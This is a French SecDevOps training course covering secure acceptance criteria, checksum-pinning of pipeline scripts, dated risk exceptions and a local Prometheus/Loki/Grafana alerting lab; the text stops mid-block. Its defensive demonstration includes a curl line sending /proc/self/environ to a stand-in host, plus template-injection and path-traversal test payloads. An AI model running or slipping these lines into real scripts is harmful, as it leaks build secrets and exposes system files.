# Formation SecDevOps — JOUR 3 — Culture SecDevOps et gestion continue

## Module J3-M1 — Culture SecDevOps et sensibilisation des équipes

### Préambule

Un constat de sécurité se ferme quand une preuve le démontre : sortie de commande datée, rattachée à un responsable. Un rapport envoyé par courriel ne désigne ni la preuve, ni le responsable, ni la date de clôture.

Le 1er avril 2021, Codecov signale qu’un tiers a modifié, depuis le 31 janvier, son script d’envoi, le Bash Uploader. La modification envoyait les variables d’environnement des builds vers un serveur externe. Les pipelines qui exécutaient le script sans comparer son empreinte ne pouvaient pas détecter cet envoi.

En décembre 2020, la compromission de SolarWinds est révélée : le code malveillant passe par la chaîne de construction et porte la signature légitime de l’éditeur. CISA (Cybersecurity and Infrastructure Security Agency) documente l’incident dans l’avis AA20-352A. Un contrôle sur l’artefact final ne suffit pas quand la chaîne qui le produit est compromise.

Ces deux cas se traitent avec trois éléments : un critère vérifiable, une preuve archivée, une exception datée avec une autorité nommée.

### Le vocabulaire en clair

| Terme | En clair | Où on le rencontre |
| --- | --- | --- |
| Responsabilité partagée | Chaque rôle porte une action de sécurité nommée ; aucun rôle ne porte seul le risque. | Raffinement, revue, rétrospective. |
| Critère d’acceptation sécurisé | Exigence vérifiable à cocher pour qu’un élément soit terminé. | Ticket, `fiche-atelier.md`. |
| Preuve | Sortie de commande horodatée qui atteste le contrôle, pas une déclaration. | Archive Jenkins, fiche d’atelier. |
| Intégrité d’un artefact | Empreinte calculée comparée à une valeur épinglée. | `sha256sum`, `empreinte-attendue.txt`. |
| Exception sécurisée | Risque assumé, autorité nommée, date de réexamen, justification écrite. | Registre, fiche d’atelier. |
| Définition de terminé | Conditions communes à remplir pour clore un élément. | Rituel d’équipe. |
| Atelier de sécurité intégrée | Séance courte entre développeurs, QA (Quality Assurance) et sécurité pour décider d’actions datées. | Lab de ce module. |

### Objectifs du module

À l’issue de ce module, vous serez capable de :

1. **Justifier** par un incident daté pourquoi la culture tient sur des preuves, pas sur des rappels.
2. **Greffer** un contrôle de sécurité dans un rituel agile existant, sans créer de comité.
3. **Écrire** un critère d’acceptation sécurisé avec la commande et la sortie qui le prouvent.
4. **Vérifier** l’intégrité d’un script de pipeline par une empreinte épinglée.
5. **Formaliser** une exception datée et la faire refuser par un contrôle automatique quand l’autorité ou la date manque.

**Prérequis.** Développeurs, ingénieurs DevOps et SRE (Site Reliability Engineering), QA, ingénieurs sécurité, chefs de projet techniques. Niveau intermédiaire. Bases de Git, de Jenkins en conteneur et de Python/Flask. Le registre produit en [J2-M2](jour-02.md#module-j2-m2--gestion-des-vulnérabilités-et-remédiations) sert de source au lab.

### Contenu du module

#### 1. Une preuve, pas une consigne

Le NIST (National Institute of Standards and Technology) publie le SSDF (Secure Software Development Framework, SP 800-218). La pratique PS.1 protège le code contre les modifications non autorisées. La pratique PS.2 vérifie l’intégrité d’une livraison. Ces deux pratiques exigent des traces : une intention ne suffit pas.

Dans le cas Codecov, le script d’envoi s’exécutait dans les pipelines clients sans épinglage ni vérification. Un contrôle sans trace archivée ne se prouve plus quand la personne qui l’a mis en place quitte l’équipe.

#### 2. Greffer la sécurité aux rituels existants

La sécurité ne crée pas de cinquième rituel : elle entre dans les quatre rituels existants. Un rituel sans preuve associée ne produit qu’une intention.

| Rituel existant | Ce qu’on y ajoute | Preuve attendue |
| --- | --- | --- |
| Raffinement | Un critère d’acceptation sécurisé par élément exposé. | Critère écrit dans le ticket, avec sa commande. |
| Revue de code | Lecture des entrées, de l’autorisation, des secrets et de la journalisation. | Commentaire de revue référencé. |
| Définition de terminé | Contrôles verts et preuve archivée. | Rapport du build rattaché à l’élément. |
| Rétrospective | L’incident devient un contrôle, pas une consigne. | Nouvelle règle du pipeline, versionnée. |

#### 3. Exceptions sécurisées

Une exception est un risque assumé, pas un oubli toléré. Elle porte six champs : identifiant, composant, justification, autorité nommée, date de réexamen, preuve. Sans date de réexamen, l’exception devient permanente sans être réexaminée.

Le modèle SAMM (Software Assurance Maturity Model) de l’OWASP (Open Worldwide Application Security Project), version 2, traite cette formalisation dans la fonction Governance, pratique Policy and Compliance. Une dérogation non tracée contourne la politique. Une exception incomplète fait échouer le contrôle automatique.

#### 4. Ce que l’atelier doit produire

Un atelier de sécurité intégrée réunit développeurs, QA et sécurité pendant trente minutes et produit trois choses : des risques classés, des actions avec propriétaire et échéance, une autorité qui accepte ou refuse le report. Une réunion qui produit une liste de sujets sans propriétaire n’a rien produit.

Le décor du lab est une direction interministérielle : quatre rôles, un constat critique du registre J2-M2, un arbitrage à rendre sur le report d’une échéance.

### Les techniques, pas à pas

#### Technique 1 — Écrire un critère d’acceptation avec sa preuve

Un critère sans commande se discute ; un critère avec sortie se vérifie. Ici, le critère « le registre est complet » devient vérifiable par le script de forme livré en J2-M2.

```bash
cd labs/lab-jour-02/j2-m2
bash scripts/verifier-registre.sh corrige/registre-vulnerabilites.md; echo "code=$?"
```

```text
OK : 18 ligne(s) en décision « corrigée »
OK : 5 ligne(s) en décision « planifiée »
OK : 1 ligne(s) en décision « atténuée »
OK : 1 ligne(s) en décision « fausse alerte »
INFO : 25 ligne(s) de constat analysée(s)
RESULTAT : registre conforme
code=0
```

Cette sortie prouve que chaque ligne porte un propriétaire, une échéance et une décision du vocabulaire admis. Elle ne prouve pas que les preuves sont vraies : un script de forme ne juge pas le contenu, la revue humaine reste nécessaire.

#### Technique 2 — Épingler l’intégrité d’un script de pipeline

Le pipeline récupère puis exécute le script `monter-script.sh`, qui prépare le poste de build et affiche `préparation du poste de build` ; la démonstration le crée par `printf 'echo préparation du poste de build\n' > monter-script.sh`. On calcule son empreinte une fois, on la versionne, puis on la compare à chaque exécution : elle atteste que le fichier exécuté est celui qui a été relu.

```bash
sha256sum monter-script.sh | cut -d' ' -f1 > empreinte-attendue.txt
cat empreinte-attendue.txt
```

```text
04d19a2f09197dffadd7dccced74ef862bea4c58b30bb4afa463195dc0219529
```

```bash
# scripts/executer-si-intact.sh
attendue=$(cut -d' ' -f1 empreinte-attendue.txt)
obtenue=$(sha256sum monter-script.sh | cut -d' ' -f1)
if [ "$attendue" != "$obtenue" ]; then
  echo "empreinte différente — script non exécuté"
  exit 1
fi
bash monter-script.sh
```

```bash
bash scripts/executer-si-intact.sh; echo "code=$?"
```

```text
préparation du poste de build
code=0
```

Cas d’échec : ajoutez au script une ligne `curl -s -X POST http://exemple.invalid/collecte -d @/proc/self/environ`, puis relancez.

```text
empreinte différente — script non exécuté
code=1
```

L’empreinte passe de `04d19a2f…` à `762875b6…` et le script n’est pas exécuté. Le contrôle prouve que le contenu exécuté est celui qui a été validé. Il ne prouve pas que ce contenu était sain, ni que la valeur épinglée n’a pas été modifiée avec le script. La revue de la modification de l’empreinte reste obligatoire.

#### Technique 3 — Refuser une acceptation sans autorité ni date

Une acceptation doit respecter un format fixe, que le contrôle vérifie. Le script lit la colonne de décision du tableau des risques et refuse toute acceptation sans autorité ni date.

```bash
awk -F'|' '/^\| Risque \| Gravité/ {tableau=1; next}
tableau && /^## / {tableau=0}
tableau && /^\|/ && $0 !~ /^\|[-: |]+\|$/ {
  for (i=2; i<=5; i++) gsub(/^ +| +$/, "", $i)
  if ($5 !~ /acceptée/) next
  n++
  if ($5 !~ /\/ [0-9][0-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9]/ || $5 !~ /resp-/) {
    print "ECHEC : acceptation sans autorité ou sans date —", $2; e++
  }
}
END { print n+0 " acceptation(s) examinée(s), " e+0 " incomplète(s)"; exit (e > 0) }' fiche-atelier.md
```

Sur une fiche valide, la sortie est `1 acceptation(s) examinée(s), 0 incomplète(s)` et le code vaut 0. Remplacez la décision `acceptée / resp-plateforme / 2027-01-29` par `acceptée` seul :

```text
ECHEC : acceptation sans autorité ou sans date — 44 HIGH de l'image sans correctif
1 acceptation(s) examinée(s), 1 incomplète(s)
code=1
```

L’atelier ne peut pas clore sur une acceptation que ce script refuse. Ce contrôle rend la règle exécutable : un désaccord se tranche par une date écrite.

### Lab — Atelier collaboratif de sécurité intégrée

Le lab simule un atelier : quatre rôles, un constat critique du registre J2-M2, une demande de report d’échéance. Vous produisez la fiche d’atelier et son contrôle.

#### Prérequis

- avoir exécuté les techniques 1 à 3 ;
- [registre J2-M2](jour-02.md#module-j2-m2--gestion-des-vulnérabilités-et-remédiations) disponible dans `labs/lab-jour-02/j2-m2/`, rempli ou version corrigée ;
- aucun conteneur à démarrer : l’atelier ne consomme que des fichiers et `awk`.

#### Environnement

| Élément | Valeur |
| --- | --- |
| Hôte | Docker local, sans orchestration |
| Dossier du lab | `labs/lab-jour-03/j3-m1/` |
| Modèle de fiche | `modeles/fiche-atelier-modele.md` |
| Source des constats | [`labs/lab-jour-02/j2-m2/corrige/registre-vulnerabilites.md`](labs/lab-jour-02/j2-m2/corrige/registre-vulnerabilites.md) |
| Contrôles | `scripts/verifier-fiche.sh`, écrit à l’étape 4 |
| Outils | `awk`, `sha256sum`, Git |

#### Étapes du lab

**Étape 1 — Cadrer l’atelier**

Copiez le modèle, puis renseignez le scénario et le tableau des rôles. Le scénario reprend un constat critique du [registre J2-M2](jour-02.md#module-j2-m2--gestion-des-vulnérabilités-et-remédiations) : `CODE-02`, injection de gabarit sur `/recherche`, échéance au 2026-11-07, et une demande du produit pour reporter cette échéance de trois semaines.

```bash
cd labs/lab-jour-03/j3-m1
cp modeles/fiche-atelier-modele.md fiche-atelier.md
```

```bash
grep -c '^| ' fiche-atelier.md
```

```text
4
```

La fiche ne contient encore aucune décision : seules les lignes de gabarit sont présentes.

**Étape 2 — Écrire trois critères d’acceptation sécurisés**

Renseignez le tableau des risques et le plan d’action. Chaque action porte un propriétaire, une échéance au format `AAAA-MM-JJ` et une preuve attendue qui nomme une commande et un résultat observable. Un critère qui ne nomme pas de commande est refusé à l’étape 4.

**Étape 3 — Trancher la demande de report**

Le report devient une acceptation datée dans le tableau des risques, avec l’autorité qui l’assume et la date de réexamen. Renseignez la section `Accord` avec la date de l’atelier, l’autorité nommée et la date de révision. Un report refusé se traduit par le maintien de l’échéance d’origine, sans ligne d’acceptation.

**Étape 4 — Écrire et exécuter le contrôle de la fiche**

Créez `scripts/verifier-fiche.sh` avec le contrôle suivant, qui exige trois actions complètes et refuse un gabarit non rempli.

```bash
mkdir -p scripts
cat > scripts/verifier-fiche.sh <<'FIN'
awk -F'|' '/^\| Action \| Propriétaire/ {tableau=1; next}
tableau && /^## / {tableau=0}
tableau && /^\|/ && $0 !~ /^\|[-: |]+\|$/ {
  for (i=2; i<=6; i++) gsub(/^ +| +$/, "", $i)
  if ($2 == "" || $3 == "" || $4 == "" || $0 ~ /</) {
    print "ECHEC : action incomplète —", $2; e++; next
  }
  ok++
}
END {
  if (ok < 3) print "ECHEC : " ok+0 " action(s) complète(s), trois au minimum"
  else print "OK : " ok " action(s) complète(s)"
  exit (e > 0 || ok < 3)
}' "$1"
FIN
bash scripts/verifier-fiche.sh fiche-atelier.md; echo "code=$?"
```

Sur le modèle brut, le contrôle rend `ECHEC : 0 action(s) complète(s), trois au minimum` et le code 1. Sur une fiche remplie, il rend `OK : 3 action(s) complète(s)` et le code 0. Un contrôle qui accepte le modèle vide ne contrôle rien.

**Cas d’échec à constater.** Videz la colonne `Échéance` d’une action et relancez : le script rend `ECHEC : action incomplète — Réduire la surface de /recherche` et le code 1. La ligne existe, l’action n’est pas planifiable.

**Étape 5 — Contrôler l’acceptation et archiver**

Reprenez le contrôle de la technique 3 sur la fiche remplie, puis versionnez les deux fichiers. L’archive de l’atelier est le couple fiche et sorties de contrôle, pas le compte rendu de réunion.

```bash
git add labs/lab-jour-03/j3-m1/fiche-atelier.md labs/lab-jour-03/j3-m1/scripts/verifier-fiche.sh
git commit -m "J3-M1 : fiche d'atelier sécurité intégrée et son contrôle"
git log --oneline -1
```

```text
a41c7de J3-M1 : fiche d'atelier sécurité intégrée et son contrôle
```

#### Ce que ce lab produit

- `labs/lab-jour-03/j3-m1/fiche-atelier.md` : rôles, risques classés, trois actions avec propriétaire et échéance, acceptation datée, accord.
- `labs/lab-jour-03/j3-m1/scripts/verifier-fiche.sh` : contrôle de forme exécutable, qui refuse un gabarit vide et une action incomplète.
- Un commit qui date la décision et son contrôle.

**Critère de réussite.** Le contrôle rend `OK : 3 action(s) complète(s)` et le contrôle d’acceptation rend 0 incomplète ; la demande de report porte une autorité et une date de réexamen, ou elle est refusée avec l’échéance d’origine maintenue. En cas de doute sur l’état du serveur Werkzeug (serveur de développement de Flask) dans le lab J3-M2, lire les journaux par `docker compose logs app` pour confirmer l’état avant de décider.

La fiche est consommée en [J3-M2](#module-j3-m2--approches-avancées-pour-secdevops) : le tableau de bord cite l’exception qu’elle porte, pour que le seuil renvoie à une décision écrite.

### Exercices

#### Exercice 1 — Greffer un contrôle dans un rituel

Choisissez un élément de backlog de NordMail (`CODE-05`, `POST /admin/purge` sans contrôle d’accès) et écrivez ce que la revue de code doit y vérifier, avec le résultat observable.

**Critère de réussite.** Le critère nomme une entrée, une sortie observée et la commande qui la produit. « Vérifier les autorisations » ne le satisfait pas.

#### Exercice 2 — Rédiger une acceptation datée

Transformez le constat `BASE-01` (44 HIGH de l’image sans correctif) en acceptation sécurisée.

**Critère de réussite.** Les six champs sont présents, l’autorité est un rôle et non une personne absente, la date de réexamen est postérieure à la date de détection, et le script de la technique 3 rend 0 incomplète.

#### Exercice 3 — Décider entre exception et correction

Deux constats : `CODE-03` (injection de commande, échéance au 2026-11-07) et `CODE-06` (MD5 sur un jeton, LOW, échéance au 2027-04-29). Lequel peut devenir une acceptation, et sous quelle condition l’autre ne le peut-il pas ?

**Critère de réussite.** La réponse nomme la différence d’exploitabilité, pas la différence de gravité, et fixe la condition qui ferait changer la décision.

### Résumé

- Un contrôle sans preuve archivée n’existe pas au moment de l’audit.
- Le calendrier des rituels reste fixe : ce sont les critères et les dates qui changent.
- Une acceptation sans autorité ni date revient à une vulnérabilité non traitée, consignée dans un tableau.
- L’intégrité d’un script de pipeline se vérifie par une empreinte épinglée et une revue de sa modification.

### Références

- NIST SP 800-218, Secure Software Development Framework, pratiques PS.1 et PS.2 : <https://csrc.nist.gov/pubs/sp/800/218/final>
- OWASP SAMM v2, fonction Governance : <https://owaspsamm.org/model/>
- CISA, avis AA20-352A sur la compromission SolarWinds : <https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a>
- Codecov, mise à jour de sécurité sur le Bash Uploader (15 avril 2021) : <https://about.codecov.io/security-update/>
- Agence nationale de la sécurité des systèmes d’information (ANSSI), guide d’hygiène informatique : <https://cyber.gouv.fr/publications/recommandations-relatives-lhygiene-informatique>



## Module J3-M2 — Approches avancées pour SecDevOps

### Préambule

Une courbe sans seuil ne déclenche aucune action : personne ne sait quand agir. Une surveillance utile envoie une alerte qui désigne l’action à mener, dans les minutes qui suivent le changement de comportement.

Le 29 mars 2024, une porte dérobée est rendue publique dans xz-utils, versions 5.6.0 et 5.6.1 (CVE-2024-3094). Aucune base de signatures ne la décrivait : le code était malveillant, et non vulnérable. Une lenteur de connexion, remarquée à l’usage, a conduit à l’analyse.

### Le vocabulaire en clair

| Terme | En clair | Où on le rencontre |
| --- | --- | --- |
| Métrique | Valeur chiffrée horodatée, interrogée par requête. | `nordmail_requetes_total`, Prometheus. |
| Journal | Événement textuel horodaté, indexé par étiquettes. | `{job="nordmail"}`, Loki. |
| Étiquette | Couple clé-valeur qui identifie un flux de données. | `job`, `code`, `niveau`. |
| Règle d’alerte | Expression évaluée périodiquement, avec une fenêtre. | `prometheus/rules/nordmail.yml`. |
| État d’alerte | `inactive`, `pending` puis `firing`, puis retour à `inactive`. | Interface et API (Application Programming Interface) de Prometheus. |
| Fenêtre d’attente | Durée pendant laquelle la condition doit rester vraie (`for`). | Règle d’alerte. |
| Notifieur | Destinataire qui reçoit l’alerte, ici un point d’entrée HTTP (HyperText Transfer Protocol). | `alertmanager/alertmanager.yml`. |
| 5xx | Réponses d’erreur serveur, codes HTTP 500 à 599. | Règle d’alerte, tableau de bord. |
| Tableau de bord | Vue agrégée de quelques panneaux pour décider. | Grafana. |
| Proposition de test | Cas de test suggéré par un modèle, avant validation. | `modeles/propositions-ia.json`. |

### Objectifs du module

À l’issue de ce module, vous serez capable de :

1. **Expliquer** par xz-utils ce que la signature ne peut pas voir, et ce que l’observation du comportement ajoute.
2. **Exposer** des métriques applicatives sans ajouter de dépendance.
3. **Écrire** une règle d’alerte avec fenêtre et état, et **observer** le passage de `pending` à `firing`.
4. **Corréler** une alerte avec les journaux par étiquette `job` et filtre de ligne.
5. **Encadrer** des propositions de tests issues d’un modèle par un schéma et un rejeu.

**Prérequis.** Développeurs, ingénieurs DevOps et SRE (Site Reliability Engineering), QA (Quality Assurance), ingénieurs sécurité. Niveau intermédiaire. Bases de Docker Compose et de Flask. Les ports 9101, 9190, 3300, 3101 et 9193 sont réservés à ce module. Le registre produit en [J2-M2](jour-02.md#module-j2-m2--gestion-des-vulnérabilités-et-remédiations) et la fiche d’atelier en [J3-M1](#module-j3-m1--culture-secdevops-et-sensibilisation-des-équipes) servent de source au lab.

### Contenu du module

#### 1. Ce qu’un modèle peut proposer, ce qu’il ne peut pas décider

L’intelligence artificielle (IA) appliquée aux tests passe ici par un grand modèle de langage (LLM, Large Language Model). Ce modèle produit du texte plausible : énumération de cas de test, reformulation d’un constat, tri de faux positifs. Il ne produit ni exécution, ni preuve, ni responsabilité. Le Top 10 de l’OWASP (Open Worldwide Application Security Project) pour les applications LLM classe l’injection d’invite (prompt injection) en premier, puis la divulgation d’informations sensibles.

Deux règles rendent l’usage vérifiable. Une proposition entre dans le pipeline seulement si elle porte une entrée, un attendu observable et la commande qui le produit : c’est le schéma. Elle n’est retenue que si elle échoue sans le correctif et réussit avec lui : c’est le rejeu.

Ne jamais envoyer à un modèle externe des journaux contenant des données personnelles, des jetons ou des identifiants de session. Une ligne de journal copiée dans une invite quitte le poste : c’est une exfiltration de donnée.

#### 2. Une pile d’observation locale

Quatre conteneurs écoutent sur la boucle locale (127.0.0.1) : aucun service n’est exposé au réseau.

| Composant | Rôle | Adresse locale | Image |
| --- | --- | --- | --- |
| Prometheus | Collecte et évalue les règles | `127.0.0.1:9190` | `prom/prometheus:v3.5.0` |
| Alertmanager | Groupe et notifie | `127.0.0.1:9193` | `prom/alertmanager:v0.28.1` |
| Loki | Agrège et indexe les journaux | `127.0.0.1:3101` | `grafana/loki:3.5.1` |
| Grafana | Affiche les panneaux | `127.0.0.1:3300` | `grafana/grafana:12.1.0` |

Les images sont épinglées : une version qui change entre deux sessions rend les résultats non comparables. La rétention est de deux heures pour les métriques et de vingt-quatre heures pour les journaux : elle suffit à une session, pas à une archive.

#### 3. Alertes : seuil, fenêtre, état

Prometheus évalue une expression à intervalle régulier. Une alerte passe par trois états : `inactive`, puis `pending` tant que la condition dure moins que la fenêtre `for`, puis `firing`.

| Réglage | Effet | Défaut à éviter |
| --- | --- | --- |
| Expression | Ce qu’on mesure, sur une fenêtre glissante. | Un compteur lu sans `rate` ni `increase` (`increase` calcule sa variation sur la fenêtre) : la valeur brute ne redescend jamais. |
| Seuil | Le nombre qui sépare le bruit de l’événement. | Un seuil choisi avant d’avoir observé une journée normale. |
| `for` | Durée de confirmation avant `firing`. | Absent : chaque pic d’une seconde ouvre une alerte. |
| `group_by` | Regroupement des notifications. | Absent sur un service bavard : une notification par instance. |

#### 4. Des journaux à l’alerte

Une alerte qui n’indique pas où lire la cause ne fait que signaler un problème. La corrélation repose sur l’étiquette `job`, commune à la métrique et au journal. Une requête Loki combine un sélecteur de flux et un filtre de ligne.

Log4Shell (CVE-2021-44228, rendue publique le 9 décembre 2021) le montre : les tentatives d’exploitation apparaissent dans les journaux d’accès, sous forme de chaînes `${jndi:` placées dans un en-tête ou un paramètre. Un inventaire de dépendances indique qui est exposé. Un filtre de ligne indique qui est attaqué.

Avec les réglages du lab, `evaluation_interval: 5s` et `for: 30s` pour Prometheus, `group_wait: 10s` pour Alertmanager, une alerte part moins d’une minute après le premier dépassement. Le lab ne bloque aucune requête : la prévention reste une action, humaine ou automatisée, déclenchée par cette alerte.

### Les techniques, pas à pas

#### Technique 1 — Exposer des métriques sans dépendance

L’application compte ses réponses dans un dictionnaire et expose le format texte attendu par Prometheus, sans bibliothèque supplémentaire. Copiez `corrige/app/app.py` de J2-M2 dans `app/app.py`, puis insérez le fragment après la déclaration des notes.

Le fragment [`app/instrumentation.py`](labs/lab-jour-03/j3-m2/app/instrumentation.py) contient les deux parties à insérer : `journal` et `tracer` en premier, `/metrics` et `/webhook-alerte` ensuite.

Le point d’entrée `/metrics` sérialise ces compteurs, et `/webhook-alerte` reçoit les notifications pour les journaliser sous l’étiquette `niveau="alerte"`.

```bash
curl -s http://127.0.0.1:9101/metrics
```

```text
# TYPE nordmail_requetes_total counter
nordmail_requetes_total{route="/metrics",code="200"} 1
nordmail_requetes_total{route="/sante",code="200"} 1
# TYPE nordmail_webhook_alertes_total counter
nordmail_webhook_alertes_total 0
```

Les compteurs apparaissent au premier appel de leur route : une métrique absente n’est pas une métrique à zéro. La ligne `debug=True` de `app.run` devient `debug=False` : sinon le rechargeur crée un second processus, et les compteurs se répartissent entre deux processus.

#### Technique 2 — Écrire la règle et observer les états

Le fichier [`prometheus/rules/nordmail.yml`](labs/lab-jour-03/j3-m2/prometheus/rules/nordmail.yml) déclare la règle : plus de 20 réponses 5xx en deux minutes, condition tenue pendant 30 secondes avant `firing`.

Le trafic d’épreuve envoie une requête par seconde vers une route qui échoue, `/export?fichier=notes.txt` : le répertoire de données n’existe pas dans le conteneur.

```bash
for i in $(seq 1 60); do curl -s -o /dev/null 'http://127.0.0.1:9101/export?fichier=notes.txt'; sleep 1; done
```

```bash
curl -s http://127.0.0.1:9190/api/v1/alerts | python3 -c "
import json,sys
for a in json.load(sys.stdin)['data']['alerts']:
    print(a['labels']['alertname'], a['state'])
"
```

```text
NordMailErreurs5xx pending
```

La règle `NordMailErreurs5xx` passe d’abord à `pending`, puis à `firing` une minute plus tard, quand la fenêtre `for` est écoulée. Alertmanager transmet l’alerte au point d’entrée de l’application. Quand la fenêtre de deux minutes ne contient plus assez d’erreurs, la commande ne rend plus rien : l’alerte est revenue à `inactive`, et l’option `send_resolved: true` du destinataire `webhook-nordmail` envoie une notification de résolution.

**Cas d’échec à constater.** Quarante et un appels envoyés en trois secondes, avant le premier relevé, laissent l’alerte `inactive`. Le compteur apparaît directement à 41, et `increase` ne compte pas cette valeur initiale. Une règle fondée sur un taux se teste avec un trafic étalé dans le temps.

#### Technique 3 — Corréler l’alerte et le journal

La requête Loki se lit de gauche à droite : un sélecteur de flux entre accolades, puis un filtre de ligne.

```bash
curl -s -G http://127.0.0.1:3101/loki/api/v1/query_range \
  --data-urlencode 'query={job="nordmail"} |= "500"' \
  --data-urlencode "start=$(date -d '-15 min' +%s)000000000" \
  --data-urlencode "end=$(date +%s)000000000" --data-urlencode 'limit=5' \
  | python3 -c "
import json,sys
lignes = [(int(v[0]), v[1]) for s in json.load(sys.stdin)['data']['result'] for v in s['values']]
lignes.sort()
print(len(lignes), 'ligne(s)')
print(lignes[0][1])
"
```

```text
5 ligne(s)
500 /export depuis 172.27.0.1
```

Les notifications suivent le même chemin. La requête `{job="nordmail", niveau="alerte"}` rend deux entrées : `notification firing NordMailErreurs5xx`, puis `notification resolved NordMailErreurs5xx` après le retour à `inactive`. Les deux restent consultables, de la métrique au destinataire.

**Cas d’échec à constater.** Arrêtez Loki et envoyez une requête en erreur : l’application répond normalement, et son journal ne signale pas que la ligne n’a pas été livrée. Une panne de collecte ne se voit pas dans l’application : elle se détecte par une métrique de collecte.

#### Technique 4 — Valider les propositions d’un modèle

Un modèle propose des cas de test à partir du registre J2-M2. Le validateur accepte une proposition rejouable et refuse les autres. Il ne juge pas la pertinence : il refuse ce qui n’a pas de preuve.

Le script [`outils/valider-propositions.py`](labs/lab-jour-03/j3-m2/outils/valider-propositions.py) lit les propositions de [`modeles/propositions-ia.json`](labs/lab-jour-03/j3-m2/modeles/propositions-ia.json), vérifie les quatre champs et la présence d’une commande de preuve.

```bash
python3 outils/valider-propositions.py modeles/propositions-ia.json; echo "code=$?"
```

```text
ACCEPTE 1 : /recherche — q={{7*7}}
ACCEPTE 2 : /export — fichier=../../etc/passwd
REFUS 3 : champ(s) manquant(s) preuve — /notes
2 acceptée(s), 1 refusée(s)
code=1
```

La troisième proposition, « la requête est acceptée », n’a pas de champ `preuve` : elle est refusée sans exécution. Une proposition acceptée reste à rejouer. Le validateur vérifie les champs et la présence d’une commande, mais il ne vérifie pas que la proposition détecte quelque chose.

### Lab — Tableau de bord de surveillance

Vous montez la pile locale, instrumentez l’application, prouvez le cycle d’une alerte et remplissez la fiche de preuves.

#### Prérequis

- avoir exécuté les techniques 1 à 4 ;
- Docker Engine 29.1.3 et Docker Compose 2.40.3 ;
- ports 9101, 9190, 3300, 3101 et 9193 libres ;
- accès à un registre d’images ; l’application se construit avec accès à l’index Python, sinon la variante décrite à l’étape 2 s’applique ;
- livrable [J3-M1](#module-j3-m1--culture-secdevops-et-sensibilisation-des-équipes) présent : `labs/lab-jour-03/j3-m1/fiche-atelier.md`.

#### Environnement

| Élément | Valeur |
| --- | --- |
| Hôte | Ubuntu 26.04, Docker local, sans orchestration |
| Dossier du lab | `labs/lab-jour-03/j3-m2/` |
| Application | copie instrumentée de NordMail, `127.0.0.1:9101`, image construite `j3m2-app` |
| Prometheus | `127.0.0.1:9190`, `prom/prometheus:v3.5.0` |
| Alertmanager | `127.0.0.1:9193`, `prom/alertmanager:v0.28.1` |
| Loki | `127.0.0.1:3101`, `grafana/loki:3.5.1` |
| Grafana | `127.0.0.1:3300`, `grafana/grafana:12.1.0` |
| Seuil d’alerte | 20 réponses 5xx en 2 minutes, fenêtre `for: 30s` |
| Modèle de preuves | `modeles/tableau-bord-preuves.md` |

#### Étapes du lab

**Étape 1 — Construire l’arborescence et la pile**

Placez-vous dans le dossier du lab. Le fichier [`docker-compose.yml`](labs/lab-jour-03/j3-m2/docker-compose.yml) ne publie chaque port que sur la boucle locale ; les configurations des services sont dans le même dossier.

```bash
cd labs/lab-jour-03/j3-m2
docker compose config --quiet; echo "code=$?"
```

```text
code=0
```

L’accès anonyme à Grafana en rôle `Admin` n’est acceptable que sur la boucle locale d’un lab : il supprime toute authentification à l’interface. En production, on active l’authentification et on retire le rôle administrateur du compte anonyme.

**Étape 2 — Instrumenter l’application et la cible Prometheus**

Copiez l’application de J2-M2, ajoutez le fragment de la technique 1, passez `debug` à `False`, puis créez `app/Dockerfile` sur `python:3.12-slim` avec `requirements.txt` inchangé. Sans accès à l’index Python depuis le démon Docker, éditez `docker-compose.yml` : remplacez la clé `build: ./app` du service `app` par `image: j2m1-app:1` et ajoutez le montage `./app/app.py:/app/app.py` ; l’image du module J2-M1 contient déjà Flask 2.3.2.

Le fichier [`prometheus/prometheus.yml`](labs/lab-jour-03/j3-m2/prometheus/prometheus.yml) déclare la cible `app:5000`, un intervalle de collecte de 5 secondes et l’alertmanager.

```bash
docker compose up -d --build
curl -s http://127.0.0.1:9190/api/v1/targets | python3 -c "
import json,sys
for t in json.load(sys.stdin)['data']['activeTargets']:
    print(t['labels']['job'], t['health'], t['scrapeUrl'])
"
```

```text
nordmail up http://app:5000/metrics
```

**Étape 3 — Produire l’alerte et l’observer**

Le notifieur et la configuration Loki sont fournis. Relancez la pile avec la règle de la technique 2 en place.

Le notifieur est dans [`alertmanager/alertmanager.yml`](labs/lab-jour-03/j3-m2/alertmanager/alertmanager.yml) : il envoie les alertes, et leur résolution, au point d’entrée `/webhook-alerte`.

La configuration Loki, qui conserve les journaux vingt-quatre heures, est dans [`loki/loki.yml`](labs/lab-jour-03/j3-m2/loki/loki.yml).

```bash
docker compose up -d
curl -s http://127.0.0.1:9190/api/v1/rules | python3 -c "
import json,sys
for g in json.load(sys.stdin)['data']['groups']:
    for r in g['rules']:
        print(r['name'], r['state'])
"
```

```text
NordMailErreurs5xx inactive
```

Lancez ensuite le trafic d’épreuve de la technique 2, puis relevez l’état toutes les trente secondes. Le déroulement attendu est `pending`, puis `firing`, puis le retour à aucune alerte active environ deux minutes après l’arrêt du trafic.

**Étape 4 — Construire le tableau de bord**

Les sources de données, Prometheus et Loki, sont dans [`datasources.yml`](labs/lab-jour-03/j3-m2/grafana/provisioning/datasources/datasources.yml).

Le tableau de bord, à trois panneaux, est dans [`nordmail-securite.json`](labs/lab-jour-03/j3-m2/grafana/dashboards/nordmail-securite.json) : taux de 5xx, notifications reçues et journaux.

Le fichier [`provider.yml`](labs/lab-jour-03/j3-m2/grafana/provisioning/dashboards/provider.yml) est fourni dans le lab. Voici son contenu : il déclare le dossier des tableaux de bord. Redémarrez Grafana (`docker compose restart grafana`) puis vérifiez par l’interface de programmation.

```yaml
apiVersion: 1
providers:
  - name: nordmail
    type: file
    options:
      path: /var/lib/grafana/dashboards
```

```bash
curl -s http://127.0.0.1:3300/api/health | python3 -c "
import json,sys
d = json.load(sys.stdin)
print(d['database'], d['version'])
"
curl -s http://127.0.0.1:3300/api/dashboards/uid/nordmail-securite | python3 -c "
import json,sys
d = json.load(sys.stdin)['dashboard']
print(d['title'])
for p in d['panels']:
    print(p['id'], p['type'], '|', p['title'])
"
```

```text
ok 12.1.0
NordMail — surveillance de sécurité
1 timeseries | Réponses 5xx par seconde
2 stat | Notifications d'alerte reçues
3 logs | Journaux NordMail
```

**Étape 5 — Remplir la fiche de preuves**

Copiez le modèle et remplissez les quatre parties avec les sorties réellement observées : état de chaque conteneur, requête de chaque panneau avec son seuil, règle d’alerte avec gravité et destinataire, et la référence à l’exception acceptée de J3-M1. Le test de la règle se note « oui » seulement si vous avez vu `pending` puis `firing`.

```bash
